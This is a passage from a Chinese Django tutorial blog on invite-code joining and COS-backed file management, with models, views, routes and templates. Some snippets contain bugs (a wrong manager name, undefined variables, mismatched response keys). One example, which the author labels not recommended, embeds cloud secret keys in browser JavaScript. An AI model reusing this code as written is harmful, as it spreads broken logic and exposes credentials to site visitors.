JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'form'</span>: form.errors&#125;)</span><br><span class="line"></span><br><span class="line">        random_invite_code = uid(request.tracer.user.mobile_phone)</span><br><span class="line">        form.instance.project = request.tracer.project</span><br><span class="line">        form.instance.code = random_invite_code</span><br><span class="line">        form.instance.creator = request.tracer.project.creator</span><br><span class="line">        form.save()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将验证码返回给前端，前端页面展示出来</span></span><br><span class="line">        url = <span class="string">"&#123;scheme&#125;://&#123;host&#125;&#123;path&#125;"</span>.format(</span><br><span class="line">            scheme=request.scheme,</span><br><span class="line">            host=request.get_host(),</span><br><span class="line">            path=reverse(<span class="string">'invite_join'</span>,kwargs=&#123;<span class="string">'code'</span>:random_invite_code&#125;)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: url&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>:<span class="literal">False</span>,<span class="string">'form'</span>:form.errors&#125;)</span><br></pre></td></tr></table></figure></li><li><p>前端处理显示邀请码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">/*</span><br><span class="line">     生成邀请码</span><br><span class="line">     */</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bindCreateInviteCode</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#btnGenInviteCode'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">'.error-msg'</span>).empty();</span></span><br><span class="line"><span class="javascript">            $.ajax(&#123;</span></span><br><span class="line">                url: INVITER_URL,</span><br><span class="line"><span class="actionscript">                type: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="javascript">                data: $(<span class="string">'#inviteForm'</span>).serialize(),</span></span><br><span class="line"><span class="actionscript">                dataType: <span class="string">"JSON"</span>,</span></span><br><span class="line"><span class="actionscript">                success: <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line">                    if (res.status) &#123;</span><br><span class="line"><span class="javascript">                        $(<span class="string">'#inviteArea'</span>).removeClass(<span class="string">'hide'</span>).find(<span class="string">'#inviteUrl'</span>).val(res.data)</span></span><br><span class="line"><span class="actionscript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                        $.each(res.error, <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                            $(<span class="string">'#id_'</span> + key).next(<span class="string">'.error-msg'</span>).text(value[<span class="number">0</span>])</span></span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="12-9-4-访问邀请码"><a href="#12-9-4-访问邀请码" class="headerlink" title="12.9.4 访问邀请码"></a>12.9.4 访问邀请码</h4><ul><li><p>构造url请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line"><span class="comment"># 访问邀请码</span></span><br><span class="line">url(<span class="string">r'^invite/join/(?P&lt;code&gt;\w+)$'</span>, issues.invite_join, name=<span class="string">'invite_join'</span>),</span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 问题管理</span></span><br><span class="line">...</span><br><span class="line">    <span class="comment"># 编辑问题</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 问题更新</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 问题讨论</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 生成邀请码</span></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>后端对邀请码访问进行处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invite_join</span><span class="params">(request,code)</span>:</span></span><br><span class="line">    <span class="string">"""访问邀请码"""</span></span><br><span class="line">    <span class="comment"># 获取当前时间</span></span><br><span class="line">    current_datetime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line">    invite_obj = models.ProjectInvite.objects.filter(code=code).first()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> invite_obj:</span><br><span class="line">        <span class="keyword">return</span> render(request,<span class="string">'manage/invite_join.html'</span>,&#123;<span class="string">'error'</span>:<span class="string">'邀请码不存在'</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> invite_obj.project.creator == request.tracer.user:</span><br><span class="line">        <span class="keyword">return</span> render(request,<span class="string">'manage/invite_join.html'</span>,&#123;<span class="string">'error'</span>:<span class="string">'创建者无需再加入项目'</span>&#125;)</span><br><span class="line">    exists = models.ProjectUser.objects.filter(project=invite_obj.project,user=request.tracer.user).exists()</span><br><span class="line">    <span class="keyword">if</span> exists:</span><br><span class="line">        <span class="keyword">return</span> render(request,<span class="string">'manage/invite_join.html'</span>,&#123;<span class="string">'error'</span>:<span class="string">'已经加入项目'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最多允许的成员</span></span><br><span class="line">    max_member = invite_obj.project.creator</span><br><span class="line">    <span class="comment"># 获取创建该项目的用户的交易记录</span></span><br><span class="line">    max_transaction = models.Transaction.objects.filter(user=invite_obj.project.creator).order_by(<span class="string">'-id'</span>).first()</span><br><span class="line">    <span class="comment"># 判断该交易是否过期</span></span><br><span class="line">    <span class="keyword">if</span> max_transaction.price_policy.category == <span class="number">1</span>:</span><br><span class="line">        max_member = max_transaction.price_policy.project_member</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> max_transaction.end_datetime &lt; current_datetime:</span><br><span class="line">            free_obj = models.PricePolicy.objects.filter(category=<span class="number">1</span>).first()</span><br><span class="line">            max_member = free_obj.project_member</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_member = max_transaction.price_policy.project_member</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 目前所有成员(创建者 &amp; 参与者)</span></span><br><span class="line">    current_member = models.ProjectUser.objects.filter(project=invite_obj.project).count()</span><br><span class="line">    current_member = current_member + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> current_member &gt;= max_member:</span><br><span class="line">        <span class="keyword">return</span> render(request,<span class="string">'manage/invite_join.html'</span>,&#123;<span class="string">'error'</span>:<span class="string">'项目成员超限,请升级套餐'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 邀请码是否过期</span></span><br><span class="line">    limit_datetime = invite_obj.create_datetime + datetime.timedelta(minutes=invite_obj.period)</span><br><span class="line">    <span class="keyword">if</span> current_datetime &gt; limit_datetime:</span><br><span class="line">        <span class="keyword">return</span> render(request,<span class="string">'manage/invite_join.html'</span>,&#123;<span class="string">'error'</span>:<span class="string">'邀请码已过期'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数量限制</span></span><br><span class="line">    <span class="keyword">if</span> invite_obj.count:</span><br><span class="line">        <span class="keyword">if</span> invite_obj.use_count &gt;= invite_obj.count:</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">'manage/invite_join.html'</span>, &#123;<span class="string">'error'</span>: <span class="string">'邀请码数量使用完'</span>&#125;)</span><br><span class="line">        invite_obj.use_count += <span class="number">1</span></span><br><span class="line">        invite_obj.save()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 无数量限制 or 通过验证，加入要邀请项目</span></span><br><span class="line">    models.ProjectUser.objects.create(user=request.tracer.user,project=invite_obj.project)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新项目的参与人数</span></span><br><span class="line">    invite_obj.project.join_count += <span class="number">1</span></span><br><span class="line">    invite_obj.project.save()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'manage/invite_join.html'</span>,&#123;<span class="string">'project'</span>:invite_obj.project&#125;)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>前端展示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/manage.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">    加入项目</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.no-radius</span> &#123;</span></span><br><span class="line">            border-radius: 0;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        &#123;% if error %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-danger no-radius"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-exclamation-triangle"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> &#123;&#123; error &#125;&#125;<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-success no-radius"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-check-circle"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 加入成功<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'dashboard' project_id=project.id%&#125;"</span>&gt;</span>点击跳转至项目<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 问题管理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件管理</title>
      <link href="/2020/08/02/11%20%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/"/>
      <url>/2020/08/02/11%20%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="11-文件管理"><a href="#11-文件管理" class="headerlink" title="11 文件管理"></a>11 文件管理</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86.jpg"  alt="文件管理"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9.jpg"  alt="新建文件夹"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%BF%9B%E5%BA%A6%E6%98%BE%E7%A4%BA.jpg"  alt="上传图片进度显示"></p><h3 id="11-1-功能介绍"><a href="#11-1-功能介绍" class="headerlink" title="11.1 功能介绍"></a>11.1 功能介绍</h3><p>创建删除文件夹，及上传下载文件。</p><p><strong>相关知识点：</strong></p><ul><li>模态框 &amp; ajax请求 &amp; 后台modelForm校验</li><li>目录切换：展示当前文件下的文件夹 &amp; 文件</li><li>删除文件夹：删除嵌套的子文件夹 &amp; 子文件</li><li>js上传文件到cos （wiki使用的是python上传文件）</li><li>进度条显示</li><li>删除文件：数据库中删除 &amp; cos中也要删除</li><li>下载文件</li></ul><h3 id="11-2-数据表设计"><a href="#11-2-数据表设计" class="headerlink" title="11.2 数据表设计"></a>11.2 数据表设计</h3><table><thead><tr><th>ID</th><th>项目ID</th><th>文件<br />文件夹</th><th>类型</th><th>大小</th><th>父目录</th><th>更新者</th><th>更新时间</th><th>key</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>python</td><td>2</td><td>null</td><td>null</td><td></td><td></td><td>null</td></tr><tr><td>2</td><td>1</td><td>mysql</td><td>2</td><td>null</td><td>null</td><td></td><td></td><td>null</td></tr><tr><td>3</td><td>1</td><td>1.jpg</td><td>1</td><td>1000</td><td>null</td><td></td><td></td><td>xxx.jpg</td></tr><tr><td>4</td><td>1</td><td>2.png</td><td>1</td><td>1000</td><td>2</td><td></td><td></td><td>ccsca.png</td></tr><tr><td>5</td><td>1</td><td>Django</td><td>2</td><td>null</td><td>1</td><td></td><td></td><td>null</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileRespository</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">"""文件库"""</span></span><br><span class="line">    project = models.ForeignKey(verbose_name=<span class="string">"项目"</span>,to=<span class="string">'Project'</span>)</span><br><span class="line">    file_type_choices = (</span><br><span class="line">        (<span class="number">1</span>,<span class="string">'文件'</span>),</span><br><span class="line">        (<span class="number">2</span>,<span class="string">'文件夹'</span>),</span><br><span class="line">    )</span><br><span class="line">    file_type = models.SmallIntegerField(verbose_name=<span class="string">'类型'</span>,choices=file_type_choices)</span><br><span class="line">    name = models.CharField(verbose_name=<span class="string">'文件夹名称'</span>, max_length=<span class="number">32</span>, help_text=<span class="string">"文件/文件夹名"</span>)</span><br><span class="line">    key = models.CharField(verbose_name=<span class="string">'文件存储在cos中的key'</span>, max_length=<span class="number">128</span>,null=<span class="literal">True</span>,blank=<span class="literal">True</span>)</span><br><span class="line">    file_size = models.IntegerField(verbose_name=<span class="string">'文件大小'</span>,null=<span class="literal">True</span>,blank=<span class="literal">True</span>)</span><br><span class="line">    file_path = models.CharField(verbose_name=<span class="string">'文件路径'</span>,max_length=<span class="number">255</span>,null=<span class="literal">True</span>,blank=<span class="literal">True</span>)</span><br><span class="line">    parent = models.ForeignKey(verbose_name=<span class="string">'父级目录'</span>,to=<span class="string">'self'</span>,related_name=<span class="string">'child'</span>,null=<span class="literal">True</span>,blank=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    update_user = models.ForeignKey(verbose_name=<span class="string">'更新者'</span>,to=<span class="string">'UserInfo'</span>)</span><br><span class="line">    update_datetime = models.DateTimeField(verbose_name=<span class="string">'更新时间'</span>,auto_now=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="11-3-知识点（与项目结合）"><a href="#11-3-知识点（与项目结合）" class="headerlink" title="11.3 知识点（与项目结合）"></a>11.3 知识点（与项目结合）</h3><h4 id="1-URL传参-amp-不传参"><a href="#1-URL传参-amp-不传参" class="headerlink" title="1. URL传参 &amp; 不传参"></a>1. URL传参 &amp; 不传参</h4><p>构造文件管理的 url 地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 文件管理</span></span><br><span class="line">    url(<span class="string">r'^file/$'</span>, file.file, name=<span class="string">'file'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><p>传参 &amp; 不传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不传参  得到的就是 /file/</span></span><br><span class="line"><span class="comment"># 传参 /file/?folder_id=50</span></span><br><span class="line">传参可以通过get请求获取url后面的参数</span><br></pre></td></tr></table></figure><p>创建<code>file.py</code>文件用于存放文件函数的相关代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span><span class="params">(request,project_id)</span>:</span></span><br><span class="line">    folder_id = request.GET.get(<span class="string">'folder_id'</span>)</span><br></pre></td></tr></table></figure><h4 id="2-获取导航条"><a href="#2-获取导航条" class="headerlink" title="2. 获取导航条"></a>2. 获取导航条</h4><p>文件路径的导航条</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E5%AF%BC%E8%88%AA%E6%9D%A1.jpg"  alt="导航条"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span><span class="params">(request,project_id)</span>:</span></span><br><span class="line">    folder_id = request.GET.get(<span class="string">'folder_id'</span>)</span><br><span class="line">    </span><br><span class="line">    url_list = []<span class="comment"># 导航条列表</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> folder_id:<span class="comment"># 判断是否传参，没有则不做任何操作</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file_obj = models.FileRespository.object.filter(id=folder_id,file_type=<span class="number">2</span>).first()</span><br><span class="line">        <span class="comment"># 找到id为folder_id，并且格式是文件夹的对象</span></span><br><span class="line">        </span><br><span class="line">      row_obj = file_obj</span><br><span class="line">        <span class="keyword">while</span> row_obj:<span class="comment"># 判断给对象存不存在</span></span><br><span class="line">            <span class="comment"># 如果对象存在，把带对象的id和该对象文件夹名添加到导航条列表的第一位</span></span><br><span class="line">            url_list.insert(<span class="number">0</span>,&#123;<span class="string">'id'</span>:row_obj.id,<span class="string">'name'</span>:row_object.name&#125;)</span><br><span class="line">            <span class="comment"># 把该对象的父目录赋值到row_obj继续循环判断</span></span><br><span class="line">            row_obj = row_obj.parent</span><br></pre></td></tr></table></figure><h4 id="3-cos上传文件：js-直接上传【不推荐使用】（该项目没使用该方法）"><a href="#3-cos上传文件：js-直接上传【不推荐使用】（该项目没使用该方法）" class="headerlink" title="3. cos上传文件：js 直接上传【不推荐使用】（该项目没使用该方法）"></a>3. cos上传文件：js 直接上传【不推荐使用】（该项目没使用该方法）</h4><ul><li><p>下载 js （前端SDK）</p><p>地址：<a href="https://github.com/tencentyun/cos-js-sdk-v5/tree/master/dist" target="_blank" rel="noopener">https://github.com/tencentyun/cos-js-sdk-v5/tree/master/dist</a></p><p>引用 ： <code>&lt;script src=&quot;./cos-js-sdk-v5.min.js&quot;&gt;&lt;/script&gt;</code></p></li><li><p>前端代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>示例：直接通过秘钥进行上传文件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span> <span class="attr">id</span>=<span class="string">"uploadFile"</span> <span class="attr">multiple</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/jquery-3.4.1.min.js' %&#125;"</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/cos-js-sdk-v5.min.js' %&#125;"</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> cos;</span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">            initCOS();</span><br><span class="line">            bindChangeFileInput();</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">initCOS</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">            cos = <span class="keyword">new</span> COS(&#123;</span></span><br><span class="line"><span class="actionscript">                SecretId:<span class="string">'自己的cos的id'</span>，</span></span><br><span class="line"><span class="actionscript">                SecretKey:<span class="string">'自己的cos的key'</span>，</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">bindChangeFileInput</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">'#uploadFile'</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 获取要上传的所有文件对象列表</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// $(this)[0] = document.getElementById('uploadFile')</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> files = $(<span class="keyword">this</span>)[<span class="number">0</span>].files;</span></span><br><span class="line"><span class="javascript">                $.each(files,<span class="function"><span class="keyword">function</span>(<span class="params">index,fileObject</span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">//上传文件</span></span></span><br><span class="line">                    cos.putObject(&#123;</span><br><span class="line"><span class="actionscript">                        Bucket:<span class="string">'xxxxxxx'</span>,<span class="comment">/*必须*/</span></span></span><br><span class="line"><span class="actionscript">                        Region:<span class="string">'ap-nanjing'</span>, <span class="comment">/* 必须 */</span></span></span><br><span class="line">                        Key:fileName,</span><br><span class="line"><span class="actionscript">                        Body:fileObject,<span class="comment">//上传文件对象</span></span></span><br><span class="line"><span class="actionscript">                        onProgress:<span class="function"><span class="keyword">function</span><span class="params">(progressData)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                            <span class="comment">//进度条</span></span></span><br><span class="line"><span class="javascript">                            <span class="built_in">console</span>.log(<span class="string">"文件上传精度--&gt;"</span>,fileName,<span class="built_in">JSON</span>.stringify(progressData));</span></span><br><span class="line">                        &#125;</span><br><span class="line"><span class="actionscript">                    &#125;,<span class="function"><span class="keyword">function</span><span class="params">(err,data)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                        <span class="comment">// 是否上传成功</span></span></span><br><span class="line"><span class="actionscript">                        <span class="comment">// 把上传成功的文件信息提交给django，djangi写入数据库</span></span></span><br><span class="line"><span class="javascript">         <span class="built_in">console</span>.log(err || data);</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span 